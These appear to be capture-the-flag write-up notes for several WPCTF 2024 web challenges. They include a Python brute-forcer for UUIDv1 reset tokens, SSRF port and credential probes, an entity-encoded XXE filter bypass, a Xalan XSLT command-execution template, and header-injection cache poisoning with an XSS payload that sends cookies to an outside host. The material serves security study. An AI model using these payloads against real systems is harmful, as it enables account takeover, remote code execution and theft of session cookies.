# Hr Intranet
#uuid 
## Description
A newly developed intranet portal for the Human Resources department has been found. Although still under construction, it contains some user data that might be useful. The incomplete security measures could reveal vulnerabilities, potentially allowing access to information that should be restricted.
## Road to flag
The flag it's inside the users table
```js
if (!err) {
                // Table just created, creating some rows
                const insert = 'INSERT INTO user (name, surname, password, enabled, permission) VALUES (?,?,?,?,?)';
                db.run(insert, ["admin","admin",crypto.randomBytes(30).toString('hex'), 1, PERMISSION.ADMIN])
                db.run(insert, ["Justin", "Case",crypto.randomBytes(30).toString('hex'), 0, PERMISSION.READ_ONLY])
                db.run(insert, ["Sal", "Monella",crypto.randomBytes(30).toString('hex'), 0, PERMISSION.READ_ONLY])
                db.run(insert, ["flag",FLAG,crypto.randomBytes(30).toString('hex'), 0, PERMISSION.READ_ONLY])
                db.run(insert, ["Al", "Beback",crypto.randomBytes(30).toString('hex'), 0, PERMISSION.READ_ONLY])
                db.run(insert, ["Sue", "Permann",crypto.randomBytes(30).toString('hex'), 0, PERMISSION.READ_ONLY])
            }
```
### Misc
```
sudo docker build -t hrintr . && sudo docker run -d -p 3000:3000 --name hrintr hrintr
```
## Code review
reset password uses uuidv1
```js
app.post("/api/account/reset",async (req, res) =>{
    if (!req.session.user) {
        res.status(401).json({
            success: false,
            error: "Unauthorized"
        });
        return;
    }

    // generate a new token
    const token = uuid();
```
## Exploitation
- Request 2 reset password: one for the admin and one for my account, the 2 uuids will be very similar as uuid is time dependent
```python
import itertools
import requests

url = "http://challenges.wpctf.it:39596"

s = requests.session()

tkn = "53836{}-a97a-11ef-a70f-09f95972f7d2"
hex_chars = '0123456789abcdef'

resp = s.post(f"{url}/login", json={"username":"sas","password":"sas"}).text
print(resp)

def check_guess(guess):
    resp = s.get(f"{url}/api/account/reset?token={tkn.format(guess)}").text
    # if "b81" in guess:
    #     print(guess)
    if "Invalid" not in resp:
        print(tkn.format(guess), resp)
        if "admin" in resp:
            return True
    return False

def brute_force_hex():
    for guess in itertools.product(hex_chars, repeat=3):
        guess = ''.join(guess)
        if check_guess(guess):
            print(f"Match found! The last 3 characters are: {guess}")
            return guess
    print("No match found.")

print(brute_force_hex())
```
`WPCTF{Th3S3_a73_n0t_tH3_S4nDw1ch3s_I_L1k3}`
# Employee self service portal
#ssrf 
## Description
Our infiltrator has identified the new employee self-service portal which is currently under development. This service, designed to allow employees to manage their personal information and request company services, is not yet fully operational, which could expose potential vulnerabilities.
## Overview
Nothing
## Exploitation
- url fuzz -> `/fetch`
- ssrf -> port bruteforce
	- `http://localtest.me:1042`
	- `http://localtest.me:1805`
	- `http://localtest.me:2397`
	- `http://localtest.me:10980`
	- `http://localtest.me:21074`
- ssrf -> credentials bruteforce
	- `http://admin:password@localtest.me:21074`
# Warehouse inventory
#xxe #xlst #rce #race 
## Description
An outdated web interface for the company's Inventory Management System, used daily to update warehouse stock, has been discovered. The system appears to be patched hastily over the years, leaving potential vulnerabilities. Additionally, a partial source code extraction has revealed key components of its inner workings, which might be exploitable.
## Overview
You can download and upload a file.
There's an admin panel accessible form localhost only.
## Road to flag
Execute `/cat_flag`  -> RCE
### Misc
```
sudo docker build -t emplself .
sudo docker run -d -p 1337:1337 --name emplself emplself
```
## Code review
- After the upload the file gets validated
- If the file is valid it gets written on the disk at `/app/upload/inventory.xml`
- 
## Exploitation
1. Bypass WAF
We don't have the pattern, so we have to try some payload; we notice that the entity declared with `SYSTEM` or `PUBLIC` is denied, but if we set only a string, it works. Like this

```xml
<!ENTITY xxe "test">
```
The string in XML supports HTML entities, so we can write our payload in numerical HTML entities as `parameter entities` and recall it in the `DOCTYPE`
So a single payload:

```xml
<!ENTITY xxe SYSTEM "file:///tmp">
```
will be

```xml
<!ENTITY % a "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#116;&#109;&#112;&#34;&#62;"> %a;
```
So the XML parser decodes the numeric entities and, with `%a;` reparse it. So we have XXE

2. RCE
We need a malicious `XSLT` template; we can make a Google search and find some exploits, for example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
                exclude-result-prefixes="date">
    <xsl:output method="text"/>
    <xsl:template match="/">
        <xsl:variable name="cmd"><![CDATA[cat_flag]]></xsl:variable>
        <xsl:variable name="rtObj" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
        <xsl:variable name="efgh" select="jv:getInputStream($process)" xmlns:jv="http://xml.apache.org/xalan/java"/>
        <xsl:variable name="ijkl" select="isr:new($efgh)" xmlns:isr="http://xml.apache.org/xalan/java/java.io.InputStreamReader"/>
        <xsl:variable name="mnop" select="br:new($ijkl)" xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"/>
        <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
        <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
    </xsl:template>
</xsl:stylesheet> 
```
This template runs `cat_flag`, reads the output, and prints to the screen.

After this, the exploitation path is clear:
- With XXE and `jar:` protocol, we can download the XLST file in the `/tmp` directory with a random name. The file is deleted when the request ends, so we need a server that sends the file but does not close the connection. You can see an example in the `exploit.py` file 
- Spring is a threaded server, so while the first request is pending, we can send another request with an XXE pointing to `file:///tmp` and retrieve the random name of the malicious XSLT template
- To bypass the block of `localhost` in `/admin`, we can make an XXE payload pointing to `http://localhost:6060/admin?template-file=../../../../tmp/{random_name}`
https://github.com/WuerthPhoenix/wpctf2024/blob/main/web/medium/warehouse-inventory/writeup/exploit.py
# Advanced calc
#cache-poisoning #xss
## Description
In class: 2+2 = 4 Homework: 6/2(1+2) Exam: Well, I'm not sure if you can solve this one. I'm not a real calculator. But I can try to help you with xss.
## Overview
Simple website that evaluates expressions. There's and headless bot that opens submitted urls.
Varnish is used as cache reverse proxy.
## Road to flag
The flag it's inside admin's cookies -> XSS
```js
await page.setCookie({
	name: 'flag',
	value: FLAG,
	domain: 'localhost',
});
```
## Misc
```
sudo docker build -t calc .
sudo docker run -d -p 6060:6060 --name calc calc
```
## Code review
#### Bot
- Opens the chall urls
- Stores the flag in a cookie
- Evaluates `15+18`
```js
await page.evaluate(() => {
	document.querySelector('input[name=expression]').value = '';
});

await page.type('input[name=expression]', '15+18');
await page.click('input[name=_submit]');
console.log('Expression typed');

// wait for the result
console.log('Waiting for 3 seconds');
await sleep(3000);
console.log('Waited for 3 seconds');
```
#### Varnish
This VCL script configures a Varnish cache with several features:
- **Backend routing**: Requests to `/bot` go to a separate backend, while others go to the default backend.
- **Session management**: The `calc_session` session is managed through both cookies and URL parameters, with the session ID being passed through request and response headers (`X-Calc-Session`) to ensure proper caching.
- **Caching behavior**: Caching is handled based on TTL and cache-control headers, and cookies are stripped for caching purposes to avoid caching issues related to sessions.
- **Embed URL handling**: Requests to `/embed/` are handled uniquely with hashing to separate cache entries.
#### Backend
- CSP
There's a strict CSP that allows only scripts loaded from samesite
`Content-Secutity-Policy: default-src 'self'; script-src 'self' ; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https:; connect-src 'self' https:; frame-ancestors 'self'; object-src 'none'; base-uri 'self'; form-action 'self';`
## Exploitation
1. Predict **calc_session** and **expression_id**
The rng uses **blum blum shub**
```python
def random():
    # blum blum shub
    xn = time.time_ns()
    while True:
        xn = (xn * xn) % M
        yield xn
```
And the expression id is built like this:
```python
g.calc_session_id = request.cookies.get('calc_session',str(next(rng)))
[...]
_id = f"{original}{g.calc_session_id}{str(next(rng))}"
expression_id = hashlib.sha256(_id.encode()).hexdigest()
```
So \_id will be like `2+2-PREV-NEXT`
???

2. XSS via HTTP Response Header Injection
`GET /view/ID?calc_session=1%0d%0a%0d%0a</script>alert(1)</script>`
But the CSP doesn't allow the execution of inline scripts.

3. Cache poisoning
To achieve XSS I have just to poison two pages:
- the first with the xss payload
```python
xss_payload = "top.location=`//t.ly/OTzDs?`+document.cookie;" 
requests.get(f'/embed/X?calc_session={session_id}%0d%0a%0d%0a{xss_payload}')
```
- the second with a script that loads the first poisoned page
```python
xss_payload = "<script src='/embed/X'></script>" 
requests.get(f'/embed/{expression_id}?calc_session={session_id}%0d%0a%0d%0a{xss_payload}')
```
**NOTE**: The poisoned page returns content length of 29, so the XSS payloads has to be short.

4. Call the bot and xss will be triggered
